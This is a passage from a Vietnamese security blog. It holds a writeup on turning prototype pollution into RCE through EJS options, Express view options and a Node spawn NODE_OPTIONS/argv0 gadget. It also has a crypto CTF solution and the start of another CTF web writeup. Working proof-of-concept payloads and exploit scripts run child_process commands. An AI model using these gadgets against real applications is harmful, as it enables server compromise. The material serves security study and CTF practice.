Error('Internal EJS error: no file name or template ' + 'provided'); } template = fileLoader(filename).toString().replace(_BOM, ''); } func = exports.compile(template, options); if (options.cache) { exports.cache.set(filename, func); } return func; } Trước hết nó sẽ kiểm tra options cache xem có hay không sau đó sẽ dùng filename đó đưa vào hàm cache.get(filename) để nhận về một function thứ mà ta có thể đưa data vào để nhận được template cuối cùng. Trường hợp không có cache thì sẽ dùng hàm compile với template và options được truyền vào. compile function :\nexports.compile = function compile(template, opts) { var templ; // v1 compat // 'scope' is 'context' // FIXME: Remove this in a future version if (opts \u0026amp;\u0026amp; opts.scope) { if (!scopeOptionWarned) { console.warn('`scope` option is deprecated and will be removed in EJS 3'); scopeOptionWarned = true; } if (!opts.context) { opts.context = opts.scope; } delete opts.scope; } templ = new Template(template, opts); return templ.compile(); }; Tạo một Object template và trả về kết quả sau khi gọi hàm templ.compile() Class Template khá lớn nên mình sẽ tập trung vào hàm compile của nó . Hàm compile này là core function để tạo nên một function sẽ nhận data và trả về template. Trước khi đọc các giai đoạn nó tạo ra hàm thì ta có thể đơn giản là log hàm đó ra : function anonymous(data) { var include = function (path, includeData) { var d = utils.shallowCopy(utils.createNullProtoObjWherePossible(), data); if (includeData) { d = utils.shallowCopy(d, includeData); } return includeFile(path, opts)(d); }; return fn.apply(opts.context, [data || utils.createNullProtoObjWherePossible(), escapeFn, include, rethrow]); } Copy data các kiểu xong sẽ dùng hàm fn.apply vậy ta cần biết fn ở đây là hàm gì . Đọc source ta có thẻ thấy đoạn sau : var returnedFn = opts.client ? fn : function anonymous(data) { var include = function (path, includeData) { var d = utils.shallowCopy(utils.createNullProtoObjWherePossible(), data); if (includeData) { d = utils.shallowCopy(d, includeData); } return includeFile(path, opts)(d); }; console.log(fn.toString()) return fn.apply(opts.context, [data || utils.createNullProtoObjWherePossible(), escapeFn, include, rethrow]); }; Với options.client =0 thì ta sẽ nhận được hàm trên và fn ở đây sau khi log ra thì ta có : function anonymous(locals, escapeFn, include, rethrow ) { var __line = 1 , __lines = \u0026quot;\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;\u0026quot; , __filename = undefined; try { var __output = \u0026quot;\u0026quot;; function __append(s) { if (s !== undefined \u0026amp;\u0026amp; s !== null) __output += s } with (locals || {}) { ; __append(\u0026quot;\u0026lt;h1\u0026gt;Hello \u0026quot;) ; __append(escapeFn( name )) ; __append(\u0026quot;\u0026lt;/h1\u0026gt;\u0026quot;) } return __output; } catch (e) { rethrow(e, __lines, __filename, __line, escapeFn); } } Đến đây ta hoàn toàn có thể thấy được logic mà name được đưa vào template. Khá phức tạp ở đây nhưng ta sẽ tiếp tục đọc vào hàm này. Đây là source generate được đống function trên bằng cách ghép nhiều chuỗi với nhau if (!this.source) { this.generateSource(); prepended += ' var __output = \u0026quot;\u0026quot;;\\n' + ' function __append(s) { if (s !== undefined \u0026amp;\u0026amp; s !== null) __output += s }\\n'; if (opts.outputFunctionName) { if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) { throw new Error('outputFunctionName is not a valid JS identifier.'); } prepended += ' var ' + opts.outputFunctionName + ' = __append;' + '\\n'; } if (opts.localsName \u0026amp;\u0026amp; !_JS_IDENTIFIER.test(opts.localsName)) { throw new Error('localsName is not a valid JS identifier.'); } if (opts.destructuredLocals \u0026amp;\u0026amp; opts.destructuredLocals.length) { var destructuring = ' var __locals = (' + opts.localsName + ' || {}),\\n'; for (var i = 0; i \u0026lt; opts.destructuredLocals.length; i++) { var name = opts.destructuredLocals[i]; if (!_JS_IDENTIFIER.test(name)) { throw new Error('destructuredLocals[' + i + '] is not a valid JS identifier.'); } if (i \u0026gt; 0) { destructuring += ',\\n '; } destructuring += name + ' = __locals.' + name; } prepended += destructuring + ';\\n'; } if (opts._with !== false) { prepended += ' with (' + opts.localsName + ' || {}) {' + '\\n'; appended += ' }' + '\\n'; } appended += ' return __output;' + '\\n'; this.source = prepended + this.source + appended; } if (opts.compileDebug) { src = 'var __line = 1' + '\\n' + ' , __lines = ' + JSON.stringify(this.templateText) + '\\n' + ' , __filename = ' + sanitizedFilename + ';' + '\\n' + 'try {' + '\\n' + this.source + '} catch (e) {' + '\\n' + ' rethrow(e, __lines, __filename, __line, escapeFn);' + '\\n' + '}' + '\\n'; } else { src = this.source; } if (opts.client) { src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\\n' + src; if (opts.compileDebug) { src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\\n' + src; } } if (opts.strict) { src = '\u0026quot;use strict\u0026quot;;\\n' + src; } if (opts.debug) { console.log(src); } if (opts.compileDebug \u0026amp;\u0026amp; opts.filename) { src = src + '\\n' + '//# sourceURL=' + sanitizedFilename + '\\n'; } Đến đây ta đã biết rằng hàm sau sẽ được execute và hàm được tạo bởi các string ghép lại ? Vậy sẽ thế nào nếu ta có thẻ input tùy ý vào hàm này qua options của ejs? Từ đó lấy RCE ? Ta sẽ đi tìm một vài điểm nào đó có thể cho ta input vào . Nhìn sơ ta có thể thấy if (opts.outputFunctionName) { if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) { throw new Error('outputFunctionName is not a valid JS identifier.'); } prepended += ' var ' + opts.outputFunctionName + ' = __append;' + '\\n'; } Nhưng vì có regrex khá căng nên cũng không khả thi lắm. Riêng chỉ có đoạn này :\nif (opts.client) { src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\\n' + src; if (opts.compileDebug) { src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\\n' + src; } } Well cả 2 biến client và escapeFn đều được lấy từ options object vào ? Sẽ ra sao nếu ta split javascript code với \u0026ldquo;;\u0026rdquo; và chèn rce code vào ?\nconst ejs = require(\u0026quot;ejs\u0026quot;) const template = '\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;'; escapeFunction = \u0026quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());\u0026quot; const data = { name: \u0026quot;12113awefeaw\u0026quot; } const compiled = ejs.render(template, data, { client: 1, escapeFunction: escapeFunction }); // not works console.log(compiled.toString()) Khi này function sau sẽ được generate ra :\nfunction anonymous(locals, escapeFn, include, rethrow ) { rethrow = rethrow || function rethrow(err, str, flnm, lineno, esc) { var lines = str.split('\\n'); var start = Math.max(lineno - 3, 0); var end = Math.min(lines.length, lineno + 3); var filename = esc(flnm); // Error context var context = lines.slice(start, end).map(function (line, i) { var curr = i + start + 1; return (curr == lineno ? ' \u0026gt;\u0026gt; ' : ' ') + curr + '| ' + line; }).join('\\n'); // Alter exception message err.path = filename; err.message = (filename || 'ejs') + ':' + lineno + '\\n' + context + '\\n\\n' + err.message; throw err; }; /*OUR OPTIONS GOES IN HERE */ escapeFn = escapeFn || JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());; var __line = 1 , __lines = \u0026quot;\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;\u0026quot; , __filename = undefined; try { var __output = \u0026quot;\u0026quot;; function __append(s) { if (s !== undefined \u0026amp;\u0026amp; s !== null) __output += s } with (locals || {}) { ; __append(\u0026quot;\u0026lt;h1\u0026gt;Hello \u0026quot;) ; __append(escapeFn( name )) ; __append(\u0026quot;\u0026lt;/h1\u0026gt;\u0026quot;) } return __output; } catch (e) { rethrow(e, __lines, __filename, __line, escapeFn); } } Và ta đã có thể chạy bất kì js command nào !!!\nescapeFn = escapeFn || JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());; Prototype pollution to RCE . Nhưng trong thực tế ta sẽ không kiểm soát được options được chèn vào . Vậy sẽ ra sao nếu ta có một prototype pollution ở phía server ? Test với đoạn code sau : const ejs = require(\u0026quot;ejs\u0026quot;) const template = '\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;'; ejs.clearCache(); escapeFunction = \u0026quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());\u0026quot; Object.prototype.client = true Object.prototype.escapeFunction = escapeFunction const data = { name: \u0026quot;12113awefeaw\u0026quot; } const compiled = ejs.render(template, data); // not works console.log(compiled.toString()) Hmmmm , ta thấy không có gì xảy ra cả vì nếu để ý từ đầu đoạn code đã có một phần check rất rõ :\nexports.render = function (template, d, o) { var data = d || utils.createNullProtoObjWherePossible(); var opts = o || utils.createNullProtoObjWherePossible(); } Điều này đã block việc protoytpe pollution nhưng có một vấn đề là nhiều project ở ngoài kia sẽ không bao giờ để trống options field và đơn giản sẽ truyền vào đó một empty object ~ ~!! chính điều này là root cause cho việc bypass này , để simluate ta đơn giản chỉ cần truyền {} vào là đc .\nconst ejs = require(\u0026quot;ejs\u0026quot;) const template = '\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;'; ejs.clearCache(); escapeFunction = \u0026quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());\u0026quot; Object.prototype.client = true Object.prototype.escapeFunction = escapeFunction const data = { name: \u0026quot;12113awefeaw\u0026quot; } const compiled = ejs.render(template, data, {}); // works now with polluted {} console.log(compiled.toString()) Tèn ten , điều này hoạt động vì hàm render sẽ ưu tiên nhận object từ ngoài vào. Express js Để kiểm chứng việc truyền object trống vào options ta có thể xem sơ qua source của express js ta sẽ thấy đoạn sau : Vì luôn có options object nên Express default cũng có thể bị lỗi này . POC : Server.js :\nconst express = require('express'); const path = require('path'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); // Set EJS as the template engine app.set('view engine', 'ejs'); // Set the views directory app.set('views', path.join(__dirname, 'views')); app.post(\u0026quot;/pollute_me\u0026quot;, (req, res) =\u0026gt; { // Prototype pollution vulnerability here Object.assign(Object.prototype, req.body); console.log({}.client) res.send('Updated!'); }) // Define a simple route app.get('/', (req, res) =\u0026gt; { res.render('index', { title: 'Hello EJS', message: 'Welcome to EJS Template!' }); }); // Start the server const PORT = process.env.PORT || 3000; app.listen(PORT, () =\u0026gt; { console.log(`Server running on http://localhost:${PORT}`); }); ex.py :\nimport requests url = \u0026quot;http://localhost:3000\u0026quot; escapeFunction = \u0026quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());\u0026quot; data = { \u0026quot;client\u0026quot; : '123' , \u0026quot;escapeFunction\u0026quot; : escapeFunction } res = requests.post(url+'/pollute_me' ,json=data) print(res.text) requests.get(url) Express views use a default config when calling templating function, which make it vulnerable by default!\nAnother gadget : Sẽ ra sao nếu ta không có prototype pollution nhưng có thể handle được biến data ? Khi express gọi tới render bản chất nó sẽ gọi tới export.__express // default engine export var fn = require(mod).__express Ejs :\n/** * Express.js support. * * This is an alias for {@link module:ejs.renderFile}, in order to support * Express.js out-of-the-box. * * @func */ exports.__express = exports.renderFile; Vậy bản chất của express sẽ gọi tới hàm renderFile :\nexports.renderFile = function () { var args = Array.prototype.slice.call(arguments); var filename = args.shift(); var cb; var opts = { filename: filename }; var data; var viewOpts; // Do we have a callback? if (typeof arguments[arguments.length - 1] == 'function') { cb = args.pop(); } // Do we have data/opts? if (args.length) { // Should always have data obj data = args.shift(); // Normal passed opts (data obj + opts obj) if (args.length) { // Use shallowCopy so we don't pollute passed in opts obj with new vals utils.shallowCopy(opts, args.pop()); } // Special casing for Express (settings + opts-in-data) else { // Express 3 and 4 if (data.settings) { // Pull a few things from known locations if (data.settings.views) { opts.views = data.settings.views; } if (data.settings['view cache']) { opts.cache = true; } // Undocumented after Express 2, but still usable, esp. for // items that are unsafe to be passed along with data, like `root` viewOpts = data.settings['view options']; if (viewOpts) { utils.shallowCopy(opts, viewOpts); } } // Express 2 and lower, values set in app.locals, or people who just // want to pass options in their data. NOTE: These values will override // anything previously set in settings or settings['view options'] utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS); } opts.filename = filename; } else { data = utils.createNullProtoObjWherePossible(); } return tryHandleCache(opts, data, cb); }; Hàm này khá tương đồng với hàm render bình thường nhưng sẽ có vài điểm đặc biệt đó là :\nviewOpts = data.settings['view options']; if (viewOpts) { utils.shallowCopy(opts, viewOpts); } Ta có thể thấy ở đây , data có thể ảnh hưởng trực tiếp tới biến opts và từ đó chẳng khác gì ta có thể kiểm soát biển opts và lấy rce . POC : server.js :\nconst express = require('express'); const path = require('path'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); // Set EJS as the template engine app.set('view engine', 'ejs'); // Set the views directory app.set('views', path.join(__dirname, 'views')); app.post(\u0026quot;/pollute_me\u0026quot;, (req, res) =\u0026gt; { // Prototype pollution vulnerability here const data = { title: 'Hello EJS', message: 'Welcome to EJS Template!' } Object.assign(data, req.body); res.render('index', data) }) // Define a simple route app.get('/', (req, res) =\u0026gt; { res.render('index', { title: 'Hello EJS', message: 'Welcome to EJS Template!' }); }); // Start the server const PORT = process.env.PORT || 3000; app.listen(PORT, () =\u0026gt; { console.log(`Server running on http://localhost:${PORT}`); }); ex.py :\nimport requests url = \u0026quot;http://localhost:3000\u0026quot; escapeFunction = \u0026quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());\u0026quot; data = { \u0026quot;settings\u0026quot; : { \u0026quot;view options\u0026quot; : { \u0026quot;client\u0026quot; : '123' , \u0026quot;escapeFunction\u0026quot; : escapeFunction } } } res = requests.post(url+'/pollute_me' ,json=data) print(res.text) requests.get(url) Lưu ý: gadget trên chỉ hoạt động khi kiểm soát được property trực tiếp của data chứ không phải proottype pollution vì khi parse renderOptions , nó chỉ copy các own property thui chứ không dùng luôn cả objects đấy. var renderOptions = { ...this.locals, ...opts._locals, ...opts }; How it get patched Vì root cause ở đây là do hàm generate Template function nhận opts mà không kiểm tra kĩ nên patch đơn giản nhưu sau : https://github.com/mde/ejs/compare/v3.1.9%2e%2e%2ev3.1.10 Nó sẽ kiểm tra các biến có phải là property trực tiếp hay không sau đó trả copy vào một Null Object và returns về . Không biết có bypass đc ko :v Nhìn chung nếu ta có thể kiểm soát biến data (not prototype pollution) thì rce vẫn posssible .\nMột vài điểm thú vị về for in : Xét ví dụ sau :\nscripts = { \u0026quot;pace\u0026quot;: \u0026quot;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js\u0026quot;, \u0026quot;main\u0026quot;: \u0026quot;/main.js\u0026quot;, } Object.prototype.polluted = \u0026quot;WTF\u0026quot; console.log(\u0026quot;Just log it out : \u0026quot;, scripts) for (let script in scripts) { console.log(\u0026quot;[\u0026quot; + script + \u0026quot;] =\u0026gt; \u0026quot; + scripts[script]) } Kết quả sẽ có chứa polluted không ? Câu trả lời là có : Đọc tí document về tính chất của for in ta có thể thấy rằng https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Enumerability_and_ownership_of_properties Nó sẽ chấp nhận luôn cả những enumerable là inherited từ Object prototype ! Bài này mình thấy ở malta ctf khá hay (mặc dù mình k giải ra:( )\nUniversal Gadget https://portswigger.net/web-security/prototype-pollution/server-side\nNgoài ra có một gadget khá nguy hiểm đối với các phiên bản Node js cũ khi spawn một process mới . function spawn(file, args, options) { const child = new ChildProcess(); options = normalizeSpawnArguments(file, args, options); debug('spawn', options); child.spawn(options); return child; } Hàm trên sẽ tạo một process và truyền options được lấy từ normalizeSpawnArguments Vấn đề ở đây là hàm trên có một bug về pp .\nconst env = options.env || process.env; const envPairs = []; // Prototype values are intentionally included. for (const key in env) { const value = env[key]; if (value !== undefined) { envPairs.push(`${key}=${value}`); } } return { // Make a shallow copy so we don't clobber the user's options object. ...options, args, detached: !!options.detached, envPairs, file, windowsHide: !!options.windowsHide, windowsVerbatimArguments: !!windowsVerbatimArguments }; Như ta đã biết vòng for in ở đây sẽ loop qua cả các prototype và dường như điều này đã được các developer intend nhưng mà không hiểu sao lại intend v nữa : ) Vậy spawn một process mới và kiểm soát được options thì ta có thể làm được gì ? Có một options khá thú vị nếu như ta spawn một node process . Đó là NODE_OPTIONS : https://nodejs.org/api/cli.html#node_optionsoptions Và ta có thể thấy : Kết hợp điều này với gadget trên thì ta có thể dễ dàng lấy RCE . Vậy làm sao có thể làm được khi ta không có thể tạo file ? Ta có thể lợi dụng các file đặc biệt như /proc/self/environ như ví dụ ở Kibana nhưng điều này đã bị chặn và không còn khả thi vì node js đã fixx lỗi này và luôn đặt environ ở cuối cùng. Vậy là sao để bypass ? Ta sẽ lợi dụng một file đặc biệt là file /proc/self/cmdline là file sẽ trả về argv[0] ví dụ : const { spawn } = require(\u0026quot;child_process\u0026quot;); const ls = spawn(\u0026quot;node\u0026quot;, [\u0026quot;rce.js\u0026quot;], { env: { ...process.env, // inherit parent env }, stdio: \u0026quot;inherit\u0026quot; // pipe output directly to parent terminal }); rce.js :\nconst fs = require(\u0026quot;fs\u0026quot;); const cmdline = fs.readFileSync(\u0026quot;/proc/self/cmdline\u0026quot;); console.log(cmdline.toString().split(\u0026quot;\\0\u0026quot;)); Khi này ta sẽ thấy argv[0] tương đương với \u0026rsquo;node\u0026rsquo; :\nVà điều đặc biệt là spawn function có hỗ trợ chức năng set argv[0] mà không làm thay đổi executable file . const { spawn } = require(\u0026quot;child_process\u0026quot;); const ls = spawn(\u0026quot;node\u0026quot;, [\u0026quot;rce.js\u0026quot;], { argv0: \u0026quot;abc\u0026quot;, env: { ...process.env, // inherit parent env }, stdio: \u0026quot;inherit\u0026quot; // pipe output directly to parent terminal }); Kết hợp điều này với NODE_OPTIONS và /proc/self/cmdline ta có payload như sau :+1:\nconst { spawn } = require(\u0026quot;child_process\u0026quot;); const ls = spawn(\u0026quot;node\u0026quot;, [\u0026quot;rce.js\u0026quot;], { argv0: \u0026quot;console.log(123);//\u0026quot;, env: { ...process.env, // inherit parent env NODE_OPTIONS: \u0026quot;--require /proc/self/cmdline\u0026quot; }, stdio: \u0026quot;inherit\u0026quot; // pipe output directly to parent terminal }); Cuối cùng kết hợp với prototype pollution thì ta sẽ dễ dàng có được rce . const { spawn } = require(\u0026quot;child_process\u0026quot;); Object.prototype.env = {}; // dummy object Object.prototype.env.NODE_OPTIONS = \u0026quot;--require /proc/self/cmdline\u0026quot;; // trigger loadJ Object.prototype.argv0 = `require(\u0026quot;child_process\u0026quot;).execSync(\u0026quot;id \u0026gt; pwn\u0026quot;);//`; spawn(\u0026quot;node\u0026quot;); So sánh _proto_ và constructor.prototype? Như mọi người ai cũng biết là khi làm prototype pollution ta thường dùng các key như \u0026ldquo;proto\u0026rdquo; hay \u0026ldquo;constructor.prototype\u0026rdquo; để access được Object.prototype nhưng vì sao lại như vậy ?\nConstructor.prototype : Ta có thể hiểu đơn giản là lấy prototype của constructor đó . Nhìn vào đoạn code sau : const a = {} ; // Tương đương với const a = Object.create(Object.prototype) Hàm Object.create sẽ tạo một object và sử dụng một Object đang tồn tại làm prototype cho chúng và lưu vào __proto__ . Còn constructor là trỏ về object và lấy prootytpe của Object . Nên vô tình sẽ khiến cho __proto__ == Object.prototype __proto__ Sẽ có các trường hợp __proto__ sẽ khác với constructor.prototype như : Ví dụ trên trang chính vậy. Khi này __proto__ == person. Còn constructor của nó vẫn là Object nên đơn giản trả về Object prototype Các method để lấy Prototype Cái nì mình tóm tắt trick lỏ lấy được từ X thôi :v https://x.com/arkark_/status/1943260773268230205?s=46 Challenges : Mình có làm một challenge nhỏ , mọi người có thể chơi thử và nếu có thắc mắc thì có thể DM mình nhé : https://drive.google.com/file/d/14RMwQ2WIy2g1zQl3mAE1PT7ikJkPh1zs/view?usp=sharing Lần đầu mình làm chall nên chắc sẽ có nhiều bug unintend đấy :v Resource : https://nodejs.org/api/cli.html#cli_node_options_options https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain#prototype_and_object.getprototypeof https://www.sonarsource.com/blog/blitzjs-prototype-pollution/ https://www.usenix.org/system/files/usenixsecurity23-shcherbakov.pdf https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/\n","permalink":"https://3HLD.github.io/writeups/pp2rce/","title":"Some note on Prototype pollution to RCE"},{"content":" Nothing \u0026hellip;. ","permalink":"https://3HLD.github.io/news/cookiefarmv1.0.1/","title":"Nothing here"},{"content":" Dumber Source code của bài:\nfrom Crypto.Util.number import bytes_to_long, long_to_bytes from sage.all import * a,b,p = ?,?,? pt1=\u0026quot;L3AK{test_\u0026quot; pt2=\u0026quot;flag}\u0026quot; E = EllipticCurve(Zmod(p), [a, b]) p,q=E.random_element(),E.random_element() u=bytes_to_long(pt1.encode())*p v=bytes_to_long(pt2.encode())*q # I will help u \u0026lt;3 print(p,u,q,v) Và một file output.txt\n(103905521866731574234430443362297034336 : 116589269353056499566212456950780999584 : 1) (171660318017081135625337806416866746485 : 122407097490400018041253306369079974706 : 1) (161940138185633513360673631821653803879 : 167867902631659599239485617419980253311 : 1) (95406403280474692216804281695624776780 : 109560844064302254814641159241201048462 : 1) Phân tích Ở bài này cho mình một đường cong Elliptic nhưng các tham số $a,b,p$ bị ẩn đi nhưng bù lại mình được biết thông tin về 4 điểm nằm trên đường cong này. Và từng này thông tin là đủ để recover lại các thông số trên.\nGiả sử ta có 3 cặp điểm $\\displaystyle ( x_{1} ,y_{1}) ,( x_{2} ,y_{2})$ và $\\displaystyle ( x_{3} ,y_{3})$. Từ phương trình của đường cong thì\n$$\\begin{equation*} y^{2} =x^{3} +ax+b\\bmod p \\end{equation*}$$ Từ đây nếu ta lấy hiệu các cặp điểm $$\\begin{gather*} y_{2}^{2} -y_{1}^{2} =x_{2}^{3} -x_{1}^{3} +ax_{2} -ax_{1}\\bmod p\\\\ \\Longrightarrow y_{2}^{2} -y_{1}^{2} =a( x_{2} -x_{1}) +x_{2}^{3} -x_{1}^{3} \\end{gather*}$$ Và $$\\begin{gather*} y_{3}^{2} -y_{2}^{2} =a( x_{3} -x_{2}) +x_{3}^{3} -x_{2}^{3}\\\\ \\Longrightarrow \\left( y_{3}^{2} -y_{2}^{2}\\right)( x_{2} -x_{1}) =a( x_{3} -x_{2})( x_{2} -x_{1}) +\\left( x_{3}^{3} -x_{2}^{3}\\right)( x_{2} -x_{1})\\\\ y_{2}^{2} -y_{1}^{2} =a( x_{2} -x_{1}) +x_{2}^{3} -x_{1}^{3}\\\\ \\Longrightarrow \\left( y_{2}^{2} -y_{1}^{2}\\right)( x_{3} -x_{2}) =a( x_{3} -x_{2})( x_{2} -x_{1}) +\\left( x_{2}^{3} -x_{1}^{3}\\right)( x_{3} -x_{2})\\\\ \\Longrightarrow \\left( y_{2}^{2} -y_{1}^{2}\\right)( x_{3} -x_{2}) -\\left( y_{3}^{2} -y_{2}^{2}\\right)( x_{2} -x_{1}) =\\left( x_{2}^{3} -x_{1}^{3}\\right)( x_{3} -x_{2}) -\\left( x_{3}^{3} -x_{2}^{3}\\right)( x_{2} -x_{1})\\\\ \\Longrightarrow \\left( y_{1}^{2} -y_{2}^{2} -x_{1}^{3} +x_{2}^{3}\\right)( x_{2} -x_{3}) -\\left( y_{2}^{2} -y_{3}^{2} -x_{2}^{3} +x_{3}^{3}\\right)( x_{1} -x_{2}) \\vdots p \\end{gather*}$$ Làm tương tự với bộ 3 điểm khác thì ta cũng sẽ được 1 giá trị là bội của $\\displaystyle p$. Lấy ước chung 2 biểu thức này thì ta sẽ khôi phục lại được $\\displaystyle p$.\nSau khi có lại $\\displaystyle p$ và hai điểm $\\displaystyle ( x_{1} ,y_{1}) ,( x_{2} ,y_{2})$ thì mọi người có thể làm như sau Recover Curve parameters\nCuối cùng, sau khi recover lại xong xuôi thì mình check order và phát hiện ra order của đường cong này cũng chính là modulo $\\displaystyle p$. Vậy thì để giải DLP ta sẽ sử dụng Smart\u0026rsquo;s Attack.\nScript: from sage.all import * from Crypto.Util.number import * def attack(p, x1, y1, x2, y2): a = pow(x1 - x2, -1, p) * (pow(y1, 2, p) - pow(y2, 2, p) - (pow(x1, 3, p) - pow(x2, 3, p))) % p b = (pow(y1, 2, p) - pow(x1, 3, p) - a * x1) % p return int(a), int(b) points = [ (103905521866731574234430443362297034336, 116589269353056499566212456950780999584), (171660318017081135625337806416866746485, 122407097490400018041253306369079974706), (161940138185633513360673631821653803879, 167867902631659599239485617419980253311), (95406403280474692216804281695624776780, 109560844064302254814641159241201048462) ] x1,y1 = points[0][0],points[0][1] x2,y2 = points[1][0],points[1][1] x3,y3 = points[2][0], points[2][1] x4,y4 = points[3][0],points[3][1] mul_p = (pow(y1,2)-pow(y2,2)-pow(x1,3)+pow(x2,3))*(x2-x3)-(pow(y2,2)-pow(y3,2)-pow(x2,3)+pow(x3,3))*(x1-x2) mul_q = (pow(y2,2)-pow(y3,2)-pow(x2,3)+pow(x3,3))*(x3-x4)-(pow(y3,2)-pow(y4,2)-pow(x3,3)+pow(x4,3))*(x2-x3) p = gcd(mul_p,mul_q) print(p) a,b = attack(p,x1,y1,x2,y2) print(a,b) E = EllipticCurve(Zmod(p), [a, b]) def SmartAttack(P,Q,p): E = P.curve() Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ]) P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True) for P_Qp in P_Qps: if GF(p)(P_Qp.xy()[1]) == P.xy()[1]: break Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True) for Q_Qp in Q_Qps: if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]: break p_times_P = p*P_Qp p_times_Q = p*Q_Qp x_P,y_P = p_times_P.xy() x_Q,y_Q = p_times_Q.xy() phi_P = -(x_P/y_P) phi_Q = -(x_Q/y_Q) k = phi_Q/phi_P return ZZ(k) p_fake = E(x1,y1) u = E(x2,y2) q = E(x3,y3) v = E(x4,y4) k1 = SmartAttack(p_fake,u,p) k2 = SmartAttack(q,v,p) print(long_to_bytes(k1)+long_to_bytes(k2)) L3AK{5m4rt1_1n_Th3_h00000d!!!}\n","permalink":"https://3HLD.github.io/writeups/l3akctf2025/dumber/","title":"dumber"},{"content":" L3AK CTF Write up cho bài mình không solve ra trong giải\nKnowledge : Dynamical link with LD_PRELOAD , Bypass Sessions , Md5 collision\nBài này có 2 cách : Unintended và intended nhưng mình sẽ nói sơ qua về walkthrough trước nhé\nWalthrough : Mục tiêu của bài này là lấy được RCE thông qua một đống chain\u0026hellip;\nTrong giải thì bài này mình bị kẹt vì mắc một cái bẫy CSRF khá đần . Mình thấy bug csrf ròi tìm cách làm đủ thứ nhưng hầu như chả có tác dụng gì và mình biết thấy mọi attack vector muốn hoạt động được thì đều cần forge được session nhưng vì để forge được quá khó nên hầu như mình bí ngậm ngùi\u0026hellip;\nĐọc write up Cách unintended có vẻ dễ hiểu hơn nên ta sẽ bắt đầu với nó . Idea chính để lên được RCE là set được biến môi trường :\nLD_PRELOAD =./route/to/my/flag.txt Đây là cách duy nhất để ta có thể lấy RCE nhưng mình không biết cái này nên cũng bí từ đầu ròi \u0026hellip; Ok vậy làm sao để attack được vào biến môi trường thì trong source chỉ có một đoạn ảnh hưởng đến ENV thoi\ncmd.Env = append(os.Environ(), fmt.Sprintf(\u0026quot;correct_guesses=%d\u0026quot;, u.FlagsFound)) cmd.Env = append(cmd.Env, fmt.Sprintf(\u0026quot;total_attempts=%d\u0026quot;, u.FlagsChecked)) // cai nay weird vc dang le ra phai thay chu ta : ) for k, v := range session.Properties { cmd.Env = append(cmd.Env, fmt.Sprintf(\u0026quot;%s=%s\u0026quot;, k, v)) } Ở đây ta thấy biến ENV sẽ được set theo Properties của session bằng vòng for loop .. Đáng lẽ ở đây mình nên nhận ra điều này sớm hơn vì khi ta tạo một user bình thường thì properties chỉ chứa đúng duy nhất một key thì tạo vòng for loop để làm chi :0 . Điều này dẫn đến việc ta cần phải tìm cách để forge được một jwt bất kì .\nForge JWT KEY Trong giải thì mình nghĩ đến cách sẽ leak JWT KEY bằng cách nào đó nhưng hầu như không có cách nào cả và mình bí típ : )\nThì cách unintended sẽ lợi dụng một cái bug ở register như sau :\nfunc Register(w http.ResponseWriter, r *http.Request) { session, valid, resp, err := RequestMiddleware(w, r) resp.Body = \u0026quot;/register\u0026quot; // BUG NOT CHECK VALID ? defer resp.respondRedirect() if err != nil { resp.Body = \u0026quot;/register?e=bad request\u0026quot; return } if valid \u0026amp;\u0026amp; session.LoggedIn { resp.Body = \u0026quot;/home\u0026quot; return } // Sign everything we want // Defer call when packnick and all trime defer session.UpdateSession(w) flagFile, _, err := r.FormFile(\u0026quot;flag\u0026quot;) if err != nil { session.ClearSession() resp.Body = \u0026quot;/register?e=bad request\u0026quot; return } username := r.FormValue(\u0026quot;username\u0026quot;) password := r.FormValue(\u0026quot;password\u0026quot;) displayName := r.FormValue(\u0026quot;display_name\u0026quot;) if len(username) == 0 { session.ClearSession() resp.Body = \u0026quot;/register?e=missing username\u0026quot; return } else if len(password) == 0 { session.ClearSession() resp.Body = \u0026quot;/register?e=missing password\u0026quot; return } else if len(displayName) == 0 { session.ClearSession() resp.Body = \u0026quot;/register?e=missing display name\u0026quot; return } newUser := \u0026amp;User{ Username: strings.ToLower(username), DisplayName: displayName, Password: password, UserType: UserKindStandard, UserID: uuid.NewString(), } // doan nay bi race condition available, err := newUser.CheckUsernameAvailable() if err != nil { session.ClearSession() resp.Body = \u0026quot;/register?e=bad request\u0026quot; return } if !available { session.ClearSession() resp.Body = \u0026quot;/register?e=username taken\u0026quot; return } err = os.MkdirAll(fmt.Sprintf(\u0026quot;./userdata/%s/uploads\u0026quot;, newUser.UserID), 0644) if err != nil { session.ClearSession() resp.Body = 